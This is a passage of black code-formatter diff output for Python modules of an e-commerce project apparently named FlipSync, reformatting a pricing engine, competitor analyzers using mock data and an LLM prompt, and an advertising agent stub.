                 competitor_prices, market_conditions, strategy
             )
-            
+
             # Generate reasoning
             reasoning = self._generate_pricing_reasoning(
-                current_price, recommended_price, competitive_analysis,
-                market_conditions, strategy
-            )
-            
+                current_price,
+                recommended_price,
+                competitive_analysis,
+                market_conditions,
+                strategy,
+            )
+
             # Estimate impact
             expected_impact = self._estimate_pricing_impact(
                 current_price, recommended_price, market_metrics
             )
-            
+
             return PricingRecommendation(
                 product_id=product_id,
                 current_price=current_price,
                 recommended_price=recommended_price,
                 price_change_direction=price_change_direction,
                 confidence_score=confidence_score,
                 reasoning=reasoning,
                 expected_impact=expected_impact,
-                market_conditions=self._market_conditions_to_dict(market_conditions)
-            )
-            
+                market_conditions=self._market_conditions_to_dict(market_conditions),
+            )
+
         except Exception as e:
             logger.error(f"Error in pricing analysis: {e}")
             # Return safe recommendation to maintain current price
             return PricingRecommendation(
                 product_id=product_id,
                 current_price=current_price,
                 recommended_price=current_price,
                 price_change_direction=PriceChangeDirection.MAINTAIN,
                 confidence_score=0.1,
                 reasoning=f"Error in pricing analysis: {e}. Maintaining current price.",
-                expected_impact={"error": str(e)}
-            )
-    
+                expected_impact={"error": str(e)},
+            )
+
     def _analyze_market_conditions(
-        self,
-        competitor_prices: List[Price],
-        market_metrics: Optional[MarketMetrics]
+        self, competitor_prices: List[Price], market_metrics: Optional[MarketMetrics]
     ) -> MarketConditions:
         """Analyze current market conditions."""
         # Calculate competition intensity based on price spread
         if len(competitor_prices) >= 2:
             price_amounts = [p.amount for p in competitor_prices]
             price_std = float(statistics.stdev(price_amounts))
             price_mean = float(statistics.mean(price_amounts))
             coefficient_of_variation = price_std / price_mean if price_mean > 0 else 0
-            
+
             if coefficient_of_variation > 0.2:
                 competition_intensity = "high"
                 market_volatility = coefficient_of_variation
             elif coefficient_of_variation > 0.1:
                 competition_intensity = "medium"
@@ -176,88 +184,88 @@
                 competition_intensity = "low"
                 market_volatility = coefficient_of_variation
         else:
             competition_intensity = "low"
             market_volatility = 0.0
-        
+
         # Analyze demand based on market metrics
         demand_level = "medium"  # Default
         if market_metrics:
             if market_metrics.conversion_rate and market_metrics.conversion_rate > 15:
                 demand_level = "high"
             elif market_metrics.conversion_rate and market_metrics.conversion_rate < 5:
                 demand_level = "low"
-        
+
         # Determine seasonality (simplified)
         current_month = datetime.now().month
         if current_month in [11, 12]:  # Holiday season
             seasonality_factor = 1.2
         elif current_month in [1, 2]:  # Post-holiday
             seasonality_factor = 0.8
         else:
             seasonality_factor = 1.0
-        
+
         return MarketConditions(
             demand_level=demand_level,
             competition_intensity=competition_intensity,
             seasonality_factor=seasonality_factor,
             trend_direction="stable",  # Would be calculated from historical data
             market_volatility=market_volatility,
-            inventory_pressure="medium"  # Would be based on inventory levels
-        )
-    
+            inventory_pressure="medium",  # Would be based on inventory levels
+        )
+
     def _analyze_competitors(
-        self,
-        current_price: Price,
-        competitor_prices: List[Price]
+        self, current_price: Price, competitor_prices: List[Price]
     ) -> Dict[str, Any]:
         """Analyze competitive positioning."""
         if not competitor_prices:
             return {
                 "position": "unknown",
                 "price_advantage": 0.0,
-                "competitor_count": 0
+                "competitor_count": 0,
             }
-        
+
         competitor_amounts = [p.amount for p in competitor_prices]
         min_competitor = min(competitor_amounts)
         max_competitor = max(competitor_amounts)
         avg_competitor = sum(competitor_amounts) / len(competitor_amounts)
-        
+
         # Calculate position
         position = get_price_position(current_price, competitor_prices)
-        
+
         # Calculate price advantage (negative means we're more expensive)
-        price_advantage = float((avg_competitor - current_price.amount) / avg_competitor * 100)
-        
+        price_advantage = float(
+            (avg_competitor - current_price.amount) / avg_competitor * 100
+        )
+
         return {
             "position": position,
             "price_advantage": price_advantage,
             "competitor_count": len(competitor_prices),
             "min_competitor_price": float(min_competitor),
             "max_competitor_price": float(max_competitor),
             "avg_competitor_price": float(avg_competitor),
-            "price_spread": float(max_competitor - min_competitor)
+            "price_spread": float(max_competitor - min_competitor),
         }
-    
+
     def _calculate_recommended_price(
         self,
         current_price: Price,
         competitor_prices: List[Price],
         market_conditions: MarketConditions,
         strategy: PricingStrategy,
-        cost_data: Optional[Dict[str, Any]]
+        cost_data: Optional[Dict[str, Any]],
     ) -> Price:
         """Calculate the recommended price based on all factors."""
         if not competitor_prices:
             # No competitors, maintain current price with small adjustment
             adjustment = 1.0 + (market_conditions.seasonality_factor - 1.0) * 0.5
             new_amount = current_price.amount * Decimal(str(adjustment))
         else:
             # Calculate base price from competitors
             competitor_amounts = [p.amount for p in competitor_prices]
-            
+
             if strategy.strategy_type == "competitive":
                 # Price slightly below average
                 avg_price = sum(competitor_amounts) / len(competitor_amounts)
                 base_price = avg_price * Decimal("0.98")
             elif strategy.strategy_type == "premium":
@@ -275,208 +283,226 @@
                 base_price = min_price * Decimal("0.99")
             else:
                 # Default to competitive
                 avg_price = sum(competitor_amounts) / len(competitor_amounts)
                 base_price = avg_price * Decimal("0.98")
-            
+
             # Apply market condition adjustments
             market_adjustment = Decimal(str(market_conditions.seasonality_factor))
-            
+
             # Demand adjustments
             if market_conditions.demand_level == "high":
                 market_adjustment *= Decimal("1.05")
             elif market_conditions.demand_level == "low":
                 market_adjustment *= Decimal("0.95")
-            
+
             # Competition adjustments
             if market_conditions.competition_intensity == "high":
                 market_adjustment *= Decimal("0.98")
             elif market_conditions.competition_intensity == "low":
                 market_adjustment *= Decimal("1.02")
-            
+
             new_amount = base_price * market_adjustment
-        
+
         # Apply constraints
         max_change = strategy.max_price_change
         max_increase = current_price.amount * Decimal(str(1 + max_change))
         max_decrease = current_price.amount * Decimal(str(1 - max_change))
-        
+
         # Constrain to maximum change
         if new_amount > max_increase:
             new_amount = max_increase
         elif new_amount < max_decrease:
             new_amount = max_decrease
-        
+
         # Apply absolute thresholds
         if new_amount < strategy.min_price_threshold:
             new_amount = strategy.min_price_threshold
         elif new_amount > strategy.max_price_threshold:
             new_amount = strategy.max_price_threshold
-        
+
         # Round to reasonable precision
-        new_amount = new_amount.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
-        
+        new_amount = new_amount.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
+
         return Price(
             amount=new_amount,
             currency=current_price.currency,
-            marketplace=current_price.marketplace
-        )
-    
+            marketplace=current_price.marketplace,
+        )
+
     def _determine_price_direction(
-        self,
-        current_price: Price,
-        recommended_price: Price
+        self, current_price: Price, recommended_price: Price
     ) -> PriceChangeDirection:
         """Determine the direction of price change."""
-        change_percent = calculate_price_change_percentage(current_price, recommended_price)
-        
+        change_percent = calculate_price_change_percentage(
+            current_price, recommended_price
+        )
+
         if abs(change_percent) < 1.0:  # Less than 1% change
             return PriceChangeDirection.MAINTAIN
         elif change_percent > 0:
             return PriceChangeDirection.INCREASE
         else:
             return PriceChangeDirection.DECREASE
-    
+
     def _calculate_confidence_score(
         self,
         competitor_prices: List[Price],
         market_conditions: MarketConditions,
-        strategy: PricingStrategy
+        strategy: PricingStrategy,
     ) -> float:
         """Calculate confidence score for the recommendation."""
         base_confidence = 0.7
-        
+
         # More competitors = higher confidence
         if len(competitor_prices) >= 5:
             base_confidence += 0.2
         elif len(competitor_prices) >= 3:
             base_confidence += 0.1
         elif len(competitor_prices) == 0:
             base_confidence -= 0.3
-        
+
         # Lower volatility = higher confidence
         if market_conditions.market_volatility < 0.1:
             base_confidence += 0.1
         elif market_conditions.market_volatility > 0.3:
             base_confidence -= 0.2
-        
+
         # Stable market conditions = higher confidence
         if market_conditions.competition_intensity == "medium":
             base_confidence += 0.05
         elif market_conditions.competition_intensity == "high":
             base_confidence -= 0.1
-        
+
         return max(0.1, min(1.0, base_confidence))
-    
+
     def _generate_pricing_reasoning(
         self,
         current_price: Price,
         recommended_price: Price,
         competitive_analysis: Dict[str, Any],
         market_conditions: MarketConditions,
-        strategy: PricingStrategy
+        strategy: PricingStrategy,
     ) -> str:
         """Generate human-readable reasoning for the pricing recommendation."""
         reasoning_parts = []
-        
+
         # Price change information
-        change_percent = calculate_price_change_percentage(current_price, recommended_price)
+        change_percent = calculate_price_change_percentage(
+            current_price, recommended_price
+        )
         if abs(change_percent) < 1.0:
-            reasoning_parts.append("Maintaining current price due to stable market conditions")
+            reasoning_parts.append(
+                "Maintaining current price due to stable market conditions"
+            )
         elif change_percent > 0:
             reasoning_parts.append(f"Recommending {change_percent:.1f}% price increase")
         else:
-            reasoning_parts.append(f"Recommending {abs(change_percent):.1f}% price decrease")
-        
+            reasoning_parts.append(
+                f"Recommending {abs(change_percent):.1f}% price decrease"
+            )
+
         # Competitive positioning
         position = competitive_analysis.get("position", "unknown")
         if position == "lowest":
             reasoning_parts.append("Currently priced lowest among competitors")
         elif position == "highest":
             reasoning_parts.append("Currently priced highest among competitors")
         elif position == "below_average":
             reasoning_parts.append("Currently priced below competitor average")
         elif position == "above_average":
             reasoning_parts.append("Currently priced above competitor average")
-        
+
         # Market conditions
         if market_conditions.demand_level == "high":
             reasoning_parts.append("High demand supports premium pricing")
         elif market_conditions.demand_level == "low":
             reasoning_parts.append("Low demand suggests competitive pricing")
-        
+
         if market_conditions.competition_intensity == "high":
             reasoning_parts.append("High competition requires aggressive pricing")
         elif market_conditions.competition_intensity == "low":
             reasoning_parts.append("Low competition allows for premium pricing")
-        
+
         # Seasonality
         if market_conditions.seasonality_factor > 1.1:
             reasoning_parts.append("Seasonal demand supports higher pricing")
         elif market_conditions.seasonality_factor < 0.9:
             reasoning_parts.append("Seasonal factors suggest lower pricing")
-        
+
         # Strategy
         reasoning_parts.append(f"Using {strategy.strategy_type} pricing strategy")
-        
+
         return ". ".join(reasoning_parts) + "."
-    
+
     def _estimate_pricing_impact(
         self,
         current_price: Price,
         recommended_price: Price,
-        market_metrics: Optional[MarketMetrics]
+        market_metrics: Optional[MarketMetrics],
     ) -> Dict[str, Any]:
         """Estimate the impact of the pricing change."""
-        change_percent = calculate_price_change_percentage(current_price, recommended_price)
-        
+        change_percent = calculate_price_change_percentage(
+            current_price, recommended_price
+        )
+
         # Simplified impact estimation
         # In reality, this would use historical data and elasticity models
-        
+
         estimated_impact = {
             "price_change_percent": round(change_percent, 2),
-            "estimated_sales_impact_percent": round(-change_percent * 1.5, 2),  # Price elasticity
+            "estimated_sales_impact_percent": round(
+                -change_percent * 1.5, 2
+            ),  # Price elasticity
             "estimated_revenue_impact_percent": round(change_percent * 0.5, 2),
-            "estimated_profit_impact_percent": round(change_percent * 2.0, 2)
+            "estimated_profit_impact_percent": round(change_percent * 2.0, 2),
         }
-        
+
         if market_metrics:
             # More detailed impact if we have metrics
             current_units = market_metrics.units_sold or 0
-            estimated_new_units = current_units * (1 + estimated_impact["estimated_sales_impact_percent"] / 100)
-            
-            estimated_impact.update({
-                "current_units_sold": current_units,
-                "estimated_new_units_sold": round(estimated_new_units),
-                "current_revenue": float(market_metrics.revenue or 0),
-                "estimated_new_revenue": round(float(recommended_price.amount) * estimated_new_units, 2)
-            })
-        
+            estimated_new_units = current_units * (
+                1 + estimated_impact["estimated_sales_impact_percent"] / 100
+            )
+
+            estimated_impact.update(
+                {
+                    "current_units_sold": current_units,
+                    "estimated_new_units_sold": round(estimated_new_units),
+                    "current_revenue": float(market_metrics.revenue or 0),
+                    "estimated_new_revenue": round(
+                        float(recommended_price.amount) * estimated_new_units, 2
+                    ),
+                }
+            )
+
         return estimated_impact
-    
-    def _market_conditions_to_dict(self, conditions: MarketConditions) -> Dict[str, Any]:
+
+    def _market_conditions_to_dict(
+        self, conditions: MarketConditions
+    ) -> Dict[str, Any]:
         """Convert MarketConditions to dictionary."""
         return {
             "demand_level": conditions.demand_level,
             "competition_intensity": conditions.competition_intensity,
             "seasonality_factor": conditions.seasonality_factor,
             "trend_direction": conditions.trend_direction,
             "market_volatility": conditions.market_volatility,
-            "inventory_pressure": conditions.inventory_pressure
+            "inventory_pressure": conditions.inventory_pressure,
         }
-    
+
     def create_pricing_strategy(
         self,
         strategy_type: str,
         target_margin: float,
         max_price_change: float = 0.15,
         min_price: float = 5.00,
-        max_price: float = 1000.00
+        max_price: float = 1000.00,
     ) -> PricingStrategy:
         """Create a custom pricing strategy."""
         return PricingStrategy(
             strategy_type=strategy_type,
             target_margin=target_margin,
             max_price_change=max_price_change,
             min_price_threshold=Decimal(str(min_price)),
-            max_price_threshold=Decimal(str(max_price))
-        )
+            max_price_threshold=Decimal(str(max_price)),
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/pricing_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/competitor_analyzer.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/competitor_analyzer.py	2025-06-19 04:03:41.309540+00:00
@@ -71,27 +71,36 @@
             alert_manager = AlertManager()
         if battery_optimizer is None:
             battery_optimizer = BatteryOptimizer()
 
         super().__init__(
-            agent_id, marketplace, config_manager, alert_manager, battery_optimizer, config
+            agent_id,
+            marketplace,
+            config_manager,
+            alert_manager,
+            battery_optimizer,
+            config,
         )
 
         self.vector_store = vector_store or QdrantVectorStore()
         self.metric_collector = metric_collector
-        self.similarity_threshold = config.get("similarity_threshold", 0.7) if config else 0.7
+        self.similarity_threshold = (
+            config.get("similarity_threshold", 0.7) if config else 0.7
+        )
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "similarity_threshold",
-            "analysis_interval",
-            "threat_threshold",
-            "market_share_threshold",
-            "competitor_tracking_limit"
-        ])
+        fields.extend(
+            [
+                "similarity_threshold",
+                "analysis_interval",
+                "threat_threshold",
+                "market_share_threshold",
+                "competitor_tracking_limit",
+            ]
+        )
         return fields
 
     async def analyze_competitors(
         self, category_id: str, product_data: ProductData
     ) -> List[CompetitorProfile]:
@@ -283,17 +292,23 @@
         price_positions = [p.price_position for p in competitor_profiles]
         lower_count = sum(1 for p in price_positions if p == PricePosition.LOWER)
 
         if lower_count > len(competitor_profiles) * 0.6:
             insights.append("Market is highly price-competitive")
-            recommendations.append("Consider cost optimization or value differentiation")
+            recommendations.append(
+                "Consider cost optimization or value differentiation"
+            )
 
         # Analyze threat levels
-        high_threats = [p for p in competitor_profiles if p.threat_level == ThreatLevel.HIGH]
+        high_threats = [
+            p for p in competitor_profiles if p.threat_level == ThreatLevel.HIGH
+        ]
         if high_threats:
             insights.append(f"Identified {len(high_threats)} high-threat competitors")
-            recommendations.append("Monitor high-threat competitors closely and develop counter-strategies")
+            recommendations.append(
+                "Monitor high-threat competitors closely and develop counter-strategies"
+            )
 
         # Analyze market share concentration
         total_share = sum(p.market_share for p in competitor_profiles)
         if total_share > 0.8:
             insights.append("Market is highly concentrated")
@@ -301,24 +316,22 @@
 
         return {
             "insights": insights,
             "recommendations": recommendations,
             "competitor_count": len(competitor_profiles),
-            "average_threat_level": self._calculate_average_threat_level(competitor_profiles),
-            "analysis_timestamp": datetime.now(timezone.utc).isoformat()
+            "average_threat_level": self._calculate_average_threat_level(
+                competitor_profiles
+            ),
+            "analysis_timestamp": datetime.now(timezone.utc).isoformat(),
         }
 
     def _calculate_average_threat_level(self, profiles: List[CompetitorProfile]) -> str:
         """Calculate average threat level across all competitors."""
         if not profiles:
             return "none"
 
-        threat_scores = {
-            ThreatLevel.HIGH: 3,
-            ThreatLevel.MEDIUM: 2,
-            ThreatLevel.LOW: 1
-        }
+        threat_scores = {ThreatLevel.HIGH: 3, ThreatLevel.MEDIUM: 2, ThreatLevel.LOW: 1}
 
         total_score = sum(threat_scores[p.threat_level] for p in profiles)
         avg_score = total_score / len(profiles)
 
         if avg_score >= 2.5:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/competitor_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_competitor_analyzer.py	2025-06-16 06:52:30.790118+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_competitor_analyzer.py	2025-06-19 04:03:41.420352+00:00
@@ -10,19 +10,23 @@
 from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 import numpy as np
 import pandas as pd
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 @dataclass
 class CompetitorData:
     """Competitor data structure."""
+
     competitor_id: str
     name: str
     platform: str
     product_category: str
     price: float
@@ -34,10 +38,11 @@
 
 
 @dataclass
 class CompetitorAnalysis:
     """Competitor analysis results."""
+
     product_id: str
     analysis_date: datetime
     competitor_count: int
     price_range: Dict[str, float]
     average_price: float
@@ -49,219 +54,238 @@
 
 
 class EnhancedCompetitorAnalyzer(BaseConversationalAgent):
     """
     Enhanced competitor analyzer using available dependencies.
-    
+
     Capabilities:
     - Competitor price analysis and tracking
     - Market positioning assessment
     - Competitive advantage identification
     - Pricing strategy recommendations
     - Market trend analysis
     """
-    
-    def __init__(self, agent_id: str = "enhanced_competitor_analyzer", use_fast_model: bool = True):
+
+    def __init__(
+        self,
+        agent_id: str = "enhanced_competitor_analyzer",
+        use_fast_model: bool = True,
+    ):
         """Initialize the enhanced competitor analyzer."""
         super().__init__(
             agent_role=AgentRole.MARKET,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Analysis configuration
         self.competitor_data: Dict[str, List[CompetitorData]] = {}
         self.analysis_cache: Dict[str, CompetitorAnalysis] = {}
         self.price_history: Dict[str, List[Dict]] = {}
-        
+
         logger.info(f"EnhancedCompetitorAnalyzer initialized: {self.agent_id}")
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "enhanced_competitor_analyzer",
             "capabilities": [
                 "Competitor price analysis",
-                "Market positioning assessment", 
+                "Market positioning assessment",
                 "Competitive advantage identification",
                 "Pricing strategy recommendations",
-                "Market trend analysis"
+                "Market trend analysis",
             ],
             "tracked_products": len(self.competitor_data),
-            "cached_analyses": len(self.analysis_cache)
+            "cached_analyses": len(self.analysis_cache),
         }
-    
+
     async def analyze_competitors(
-        self, 
-        product_id: str, 
-        current_price: float,
-        product_category: str = "general"
+        self, product_id: str, current_price: float, product_category: str = "general"
     ) -> CompetitorAnalysis:
         """Analyze competitors for a specific product."""
         try:
             # Get competitor data (in production, this would fetch from APIs)
             competitors = self._get_mock_competitor_data(product_id, product_category)
-            
+
             # Store competitor data
             self.competitor_data[product_id] = competitors
-            
+
             # Perform analysis using numpy/pandas
             analysis = await self._perform_competitive_analysis(
                 product_id, current_price, competitors
             )
-            
+
             # Cache analysis
             self.analysis_cache[product_id] = analysis
-            
+
             return analysis
-            
+
         except Exception as e:
             logger.error(f"Error analyzing competitors: {e}")
             raise
-    
-    def _get_mock_competitor_data(self, product_id: str, category: str) -> List[CompetitorData]:
+
+    def _get_mock_competitor_data(
+        self, product_id: str, category: str
+    ) -> List[CompetitorData]:
         """Generate mock competitor data for demonstration."""
         # In production, this would fetch real data from eBay, Amazon APIs
         base_price = 100.0
         if "iphone" in product_id.lower():
             base_price = 800.0
         elif "macbook" in product_id.lower():
             base_price = 1500.0
         elif "electronics" in category.lower():
             base_price = 200.0
-        
+
         competitors = []
         competitor_names = [
-            "TechDeals Pro", "ElectroWorld", "GadgetHub", "TechMart", "DigitalStore",
-            "ElectronicsPlus", "TechZone", "GadgetGalaxy", "TechCentral", "DigitalDeals"
+            "TechDeals Pro",
+            "ElectroWorld",
+            "GadgetHub",
+            "TechMart",
+            "DigitalStore",
+            "ElectronicsPlus",
+            "TechZone",
+            "GadgetGalaxy",
+            "TechCentral",
+            "DigitalDeals",
         ]
-        
+
         platforms = ["eBay", "Amazon", "Walmart", "Best Buy"]
-        
+
         for i, name in enumerate(competitor_names[:7]):  # Limit to 7 competitors
             # Generate realistic price variations
             price_variation = np.random.normal(0, 0.15)  # 15% standard deviation
             competitor_price = base_price * (1 + price_variation)
-            competitor_price = max(competitor_price, base_price * 0.7)  # Minimum 70% of base
-            
-            competitors.append(CompetitorData(
-                competitor_id=f"comp_{i+1}",
-                name=name,
-                platform=platforms[i % len(platforms)],
-                product_category=category,
-                price=round(competitor_price, 2),
-                listing_title=f"{name} - Premium {category.title()}",
-                sales_rank=np.random.randint(1000, 50000) if np.random.random() > 0.3 else None,
-                review_count=np.random.randint(10, 500),
-                rating=round(np.random.uniform(3.5, 5.0), 1),
-                last_updated=datetime.now(timezone.utc) - timedelta(hours=np.random.randint(1, 24))
-            ))
-        
+            competitor_price = max(
+                competitor_price, base_price * 0.7
+            )  # Minimum 70% of base
+
+            competitors.append(
+                CompetitorData(
+                    competitor_id=f"comp_{i+1}",
+                    name=name,
+                    platform=platforms[i % len(platforms)],
+                    product_category=category,
+                    price=round(competitor_price, 2),
+                    listing_title=f"{name} - Premium {category.title()}",
+                    sales_rank=(
+                        np.random.randint(1000, 50000)
+                        if np.random.random() > 0.3
+                        else None
+                    ),
+                    review_count=np.random.randint(10, 500),
+                    rating=round(np.random.uniform(3.5, 5.0), 1),
+                    last_updated=datetime.now(timezone.utc)
+                    - timedelta(hours=np.random.randint(1, 24)),
+                )
+            )
+
         return competitors
-    
+
     async def _perform_competitive_analysis(
-        self, 
-        product_id: str, 
-        current_price: float, 
-        competitors: List[CompetitorData]
+        self, product_id: str, current_price: float, competitors: List[CompetitorData]
     ) -> CompetitorAnalysis:
         """Perform competitive analysis using pandas and numpy."""
-        
+
         # Convert to DataFrame for analysis
-        df = pd.DataFrame([{
-            'name': c.name,
-            'platform': c.platform,
-            'price': c.price,
-            'sales_rank': c.sales_rank,
-            'review_count': c.review_count,
-            'rating': c.rating
-        } for c in competitors])
-        
+        df = pd.DataFrame(
+            [
+                {
+                    "name": c.name,
+                    "platform": c.platform,
+                    "price": c.price,
+                    "sales_rank": c.sales_rank,
+                    "review_count": c.review_count,
+                    "rating": c.rating,
+                }
+                for c in competitors
+            ]
+        )
+
         # Price analysis
-        prices = df['price'].values
+        prices = df["price"].values
         price_stats = {
-            'min': float(np.min(prices)),
-            'max': float(np.max(prices)),
-            'mean': float(np.mean(prices)),
-            'median': float(np.median(prices)),
-            'std': float(np.std(prices))
+            "min": float(np.min(prices)),
+            "max": float(np.max(prices)),
+            "mean": float(np.mean(prices)),
+            "median": float(np.median(prices)),
+            "std": float(np.std(prices)),
         }
-        
+
         # Determine price position
-        if current_price < price_stats['mean'] * 0.9:
+        if current_price < price_stats["mean"] * 0.9:
             price_position = "below_average"
-        elif current_price > price_stats['mean'] * 1.1:
+        elif current_price > price_stats["mean"] * 1.1:
             price_position = "above_average"
         else:
             price_position = "average"
-        
+
         # Identify competitive advantages and threats
         advantages, threats = await self._identify_competitive_factors(
             current_price, df, price_stats
         )
-        
+
         # Generate recommendations
         recommendations = await self._generate_recommendations(
             current_price, price_stats, price_position, advantages, threats
         )
-        
+
         # Calculate confidence based on data quality
         confidence = self._calculate_analysis_confidence(df)
-        
+
         return CompetitorAnalysis(
             product_id=product_id,
             analysis_date=datetime.now(timezone.utc),
             competitor_count=len(competitors),
             price_range=price_stats,
-            average_price=price_stats['mean'],
+            average_price=price_stats["mean"],
             price_position=price_position,
             competitive_advantage=advantages,
             threats=threats,
             recommendations=recommendations,
-            confidence=confidence
+            confidence=confidence,
         )
-    
+
     async def _identify_competitive_factors(
-        self, 
-        current_price: float, 
-        df: pd.DataFrame, 
-        price_stats: Dict[str, float]
+        self, current_price: float, df: pd.DataFrame, price_stats: Dict[str, float]
     ) -> tuple[List[str], List[str]]:
         """Identify competitive advantages and threats."""
         advantages = []
         threats = []
-        
+
         # Price-based advantages/threats
-        if current_price < price_stats['mean']:
+        if current_price < price_stats["mean"]:
             advantages.append("Competitive pricing below market average")
         else:
             threats.append("Higher pricing than market average")
-        
+
         # Platform diversity analysis
-        platform_counts = df['platform'].value_counts()
+        platform_counts = df["platform"].value_counts()
         dominant_platform = platform_counts.index[0]
         if platform_counts[dominant_platform] > len(df) * 0.5:
             threats.append(f"High concentration on {dominant_platform}")
         else:
             advantages.append("Good platform diversification among competitors")
-        
+
         # Rating analysis
-        high_rated_competitors = len(df[df['rating'] >= 4.5])
+        high_rated_competitors = len(df[df["rating"] >= 4.5])
         if high_rated_competitors > len(df) * 0.6:
             threats.append("Many competitors have high ratings (4.5+)")
         else:
             advantages.append("Opportunity to differentiate with superior service")
-        
+
         return advantages, threats
-    
+
     async def _generate_recommendations(
         self,
         current_price: float,
         price_stats: Dict[str, float],
         price_position: str,
         advantages: List[str],
-        threats: List[str]
+        threats: List[str],
     ) -> List[str]:
         """Generate AI-powered recommendations."""
         try:
             prompt = f"""
             Based on this competitive analysis, provide specific recommendations:
@@ -277,67 +301,68 @@
             Threats:
             {chr(10).join(f'- {threat}' for threat in threats)}
             
             Provide 3-5 specific, actionable recommendations for competitive positioning.
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are a competitive analysis expert. Provide specific, actionable recommendations."
-            )
-            
+                system_prompt="You are a competitive analysis expert. Provide specific, actionable recommendations.",
+            )
+
             # Parse recommendations (simplified)
             recommendations = [
-                line.strip().lstrip('- ').lstrip(' ')
-                for line in response.content.split('\n')
-                if line.strip() and not line.strip().startswith('Based on')
+                line.strip().lstrip("- ").lstrip(" ")
+                for line in response.content.split("\n")
+                if line.strip() and not line.strip().startswith("Based on")
             ][:5]
-            
-            return recommendations if recommendations else [
-                "Monitor competitor pricing weekly",
-                "Optimize listing for better visibility",
-                "Consider price adjustment based on market position"
-            ]
-            
+
+            return (
+                recommendations
+                if recommendations
+                else [
+                    "Monitor competitor pricing weekly",
+                    "Optimize listing for better visibility",
+                    "Consider price adjustment based on market position",
+                ]
+            )
+
         except Exception as e:
             logger.error(f"Error generating recommendations: {e}")
             return [
                 "Monitor competitor pricing regularly",
                 "Analyze market positioning",
-                "Optimize competitive strategy"
+                "Optimize competitive strategy",
             ]
-    
+
     def _calculate_analysis_confidence(self, df: pd.DataFrame) -> float:
         """Calculate confidence in the analysis."""
         confidence = 0.5  # Base confidence
-        
+
         # More competitors = higher confidence
         if len(df) >= 5:
             confidence += 0.2
         elif len(df) >= 3:
             confidence += 0.1
-        
+
         # Recent data = higher confidence
         confidence += 0.2  # Assume recent data for mock
-        
+
         # Data completeness
-        if df['sales_rank'].notna().sum() > len(df) * 0.5:
+        if df["sales_rank"].notna().sum() > len(df) * 0.5:
             confidence += 0.1
-        
+
         return min(1.0, confidence)
-    
+
     async def _process_response(self, response: Any) -> str:
         """Process and format the response."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
-    
+
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle competitor analysis queries."""
         try:
             system_prompt = """You are FlipSync's Enhanced Competitor Analyzer, an expert in competitive market analysis and positioning.
 
@@ -349,29 +374,32 @@
 - Market trend analysis using data science
 
 Provide specific, data-driven competitive intelligence and actionable recommendations."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="enhanced_competitor_analyzer",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "tracked_products": len(self.competitor_data),
                     "cached_analyses": len(self.analysis_cache),
-                    "analysis_capabilities": ["price_analysis", "market_positioning", "trend_analysis"]
-                }
-            )
-            
+                    "analysis_capabilities": [
+                        "price_analysis",
+                        "market_positioning",
+                        "trend_analysis",
+                    ],
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your competitive analysis request right now. Please try again.",
                 agent_type="enhanced_competitor_analyzer",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/enhanced_competitor_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/advertising_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/advertising_agent.py	2025-06-19 04:03:41.604119+00:00
@@ -4,31 +4,48 @@
 import logging
 from datetime import datetime, timedelta, timezone
 from typing import Any, Dict, Optional
 from uuid import uuid4
 
+
 # Simplified base agent for testing
 class BaseMarketAgent:
-    def __init__(self, agent_id, marketplace, config_manager, alert_manager, battery_optimizer, config):
+    def __init__(
+        self,
+        agent_id,
+        marketplace,
+        config_manager,
+        alert_manager,
+        battery_optimizer,
+        config,
+    ):
         self.agent_id = agent_id
         self.marketplace = marketplace
         self.config_manager = config_manager
         self.alert_manager = alert_manager
         self.battery_optimizer = battery_optimizer
         self.config = config or {}
 
     def _get_required_config_fields(self):
         return ["api_key", "marketplace_id", "rate_limit", "timeout"]
+
+
 # Simplified imports for testing
 class ConfigManager:
-    def __init__(self): pass
+    def __init__(self):
+        pass
+
 
 class AlertManager:
-    def __init__(self): pass
+    def __init__(self):
+        pass
+
 
 class BatteryOptimizer:
-    def __init__(self): pass
+    def __init__(self):
+        pass
+
 
 logger: logging.Logger = logging.getLogger(__name__)
 
 
 class AdvertisingAgent(BaseMarketAgent):
@@ -67,39 +84,46 @@
             alert_manager = AlertManager()
         if battery_optimizer is None:
             battery_optimizer = BatteryOptimizer()
 
         super().__init__(
-            agent_id, marketplace, config_manager, alert_manager, battery_optimizer, config
+            agent_id,
+            marketplace,
+            config_manager,
+            alert_manager,
